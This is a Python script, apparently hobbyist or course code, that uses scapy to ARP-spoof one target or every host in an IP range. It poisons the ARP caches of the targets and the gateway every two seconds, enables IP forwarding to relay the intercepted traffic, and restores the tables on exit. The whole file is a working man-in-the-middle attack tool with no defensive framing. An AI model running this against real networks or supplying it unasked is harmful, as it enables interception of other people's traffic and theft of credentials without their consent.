#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse
import subprocess
import ipaddress

# get command line args
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="targetip",help="Target IP to spoof")
    parser.add_option("-g","--gateway",dest="gatewayip",help="Gateway IP to spoof")
    parser.add_option("-r","--range",dest="rangeip",help="Range of IPs to spoof")
    (options, arguments) = parser.parse_args()
    if not options.targetip and not options.rangeip:
        parser.error("[-] Please enter a target IP or IP range, use --help for more info")
    if not options.gatewayip:
        parser.error("[-] Please enter a gateway IP, use --help for more info")
    else:
        return options

# function to spoof an ARP table by sending an ARP response
def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)

# helper function to get MAC address from an IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

# function to restore the ARP tables on spoofed machines once the program quits
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# scan an ip range and return  a list of values
def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    clients_list = []
    for element in answered_list:
        client_dict = {"ip":element[1].psrc,"mac":element[1].hwsrc}
        clients_list.append(client_dict)
    return clients_list

# print the can results for ip range
def print_scan(result_list):
    print("\r[+]  Found Hosts:")
    print("\r|  IP\t\t\tMAC address  |")
    print("\r-------------------------------------------")
    for client in result_list:
        print("\r| " + client["ip"] + "\t\t" + client["mac"] +" |")
        print("\r-------------------------------------------")

# spoof just one machine
def spoof_one_target(target_ip,gateway_ip):
    sent_packet_count = 0

    # enable ip forwarding
    print("[+] Enabling IP forwarding.")
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)

    # sent response packets every 2 senconds to keep ARP tables spoofed
    try:
        while True: 
            spoof(target_ip,gateway_ip)
            spoof(gateway_ip,target_ip)
            sent_packet_count += 2
            print("\r[+] Packets sent: " + str(sent_packet_count)),
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        # restore the original ARP tables when CTRL+C is pressed
        print("\n[+] Detected CTRL + C ...... Resetting ARP tables..... Please wait.")
        restore(target_ip,gateway_ip)
        restore(gateway_ip,target_ip)
        print("[+] Disabling IP forwarding.")
        # disabling IP forwarding
        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward",shell=True)
        print("[+] Quitting!")


def spoof_range(target_range,gateway_ip):
    #target_range_list = ipaddress.ip_network(unicode(target_range))
    
    sent_packet_count = 0

    # enable ip forwarding
    print("[+] Enabling IP forwarding.")
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)

    # sent response packets every 2 senconds to keep ARP tables spoofed
    try:
        while True: 
            print("\r[+] Scanning IP range for hosts."),    
            sys.stdout.flush()
            host_list = scan(target_range)
            #print_scan(host_list)
            for element in host_list:
                spoof(element["ip"],gateway_ip)
                spoof(gateway_ip,element["ip"])
                sent_packet_count += 2
    
            print("\r[+] Packets sent: " + str(sent_packet_count) + "             "),
            sys.stdout.flush()
            time.sleep(2)
    
    except KeyboardInterrupt:
        # restore the original ARP tables when CTRL+C is pressed
        print("\n[+] Detected CTRL + C ...... Resetting ARP tables..... Please wait.")
        host_list = scan(target_range)
        for element in host_list:
            restore(element["ip"],gateway_ip)
            restore(gateway_ip,element["ip"])
        print("[+] Disabling IP forwarding.")
        # disabling IP forwarding
        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward",shell=True)
        print("[+] Quitting!")



# main program
# get the arguments from the command line
options = get_arguments()

# spoof whole network or just one target?
if options.rangeip:
    spoof_range(options.rangeip,options.gatewayip)
else:
    spoof_one_target(options.targetip,options.gatewayip)

